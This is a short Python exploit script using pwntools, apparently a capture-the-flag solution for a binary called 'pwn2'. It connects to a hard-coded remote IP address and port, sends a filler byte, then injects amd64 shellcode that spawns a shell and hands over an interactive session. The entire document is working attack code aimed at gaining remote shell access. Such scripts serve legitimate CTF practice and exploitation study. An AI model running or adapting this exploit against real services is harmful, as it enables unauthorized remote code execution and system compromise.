from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('pwn2')
# r= e.process()
r = remote('139.180.137.100', 1338)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

r.sendline(b"a")
r.sendline(asm(shellcraft.sh()))

r.interactive()
